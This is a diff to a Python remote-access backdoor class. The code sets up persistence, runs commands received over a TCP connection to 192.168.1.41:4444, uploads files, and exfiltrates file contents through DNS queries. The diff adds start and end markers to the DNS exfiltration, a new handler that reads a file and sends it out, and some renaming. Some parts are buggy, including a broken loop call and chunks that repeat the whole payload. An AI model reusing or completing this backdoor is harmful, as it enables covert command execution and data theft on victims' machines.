@@ -105,11 +105,13 @@ class Backdoor:
     def send_over_dns(self, data):
         domain_name = "southpark.com"
         resp = []
+        resp.append(base64.b64encode("#START#"))
         for i in data(0, len(data), 128):
             if i+28 > len(data) - 1:
                 resp.append(data[i:len(data)])
                 break
             resp.append(data[i:i+128])
+        resp.append(base64.b64encode("#END#"))
         for chunk in resp:
             encoded_chunk = base64.b64encode(data.encode())
             encoded_chunk_str = str(encoded_chunk).strip("'-b")
@@ -117,9 +119,12 @@ class Backdoor:
             dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             dns_socket.sendto(query.pack(), (self.dns_server, 53))
             response = dnslib.DNSRecord.parse(dns_socket.recv(4096))
+    
+    def recieve_over_dns(self, data):
+        pass
 
 
-    def run(self):
+    def tcp_run(self):
         self.persistence()
         while True:
             recv_data = self.reliable_receive()
@@ -136,15 +141,34 @@ class Backdoor:
             elif recv_data[0] == "upload":
                 res = self.write_file(recv_data[1], recv_data[2])
             elif recv_data[0] == "DNS":
-                res = '.'
-                data = self.exec_system_cmd(recv_data[1:])
-                self.send_over_dns(data=data)
+                self.dns_run(recv_data[1:])
             else: 
                 res = self.exec_system_cmd(recv_data)
             self.reliable_send(res)
-
+    
+    def dns_run(self, recv_data):
+        if recv_data[0] == "download":
+            buffer = self.read_file(recv_data[1])
+            self.send_over_dns(buffer)
+            sys.exit(0)
+        else:
+            return base64.b64encode("Unable to perform request operation")
+        '''        
+        recv_data = self.send_over_dns("Active")
+        while True:
+            if recv_data[0] == "cd":
+                response = self.change_working_directory_to([recv_data[1]])
+                recv_data = self.send_over_dns(response)
+            elif recv_data[0] == "exit":
+                sys.exit(0)
+            else:
+                response = self.exec_system_cmd(recv_data[0])
+                recv_data = self.send_over_dns(response)
+        '''
 try:
-    backdoor = Backdoor("192.168.1.41",4444,"192.168.1.41")
-    backdoor.run()
+    backdoor = Backdoor("192.168.1.41",
+                        4444,
+                        "192.168.1.41")
+    backdoor.tcp_run()
 except:
     sys.exit(0)
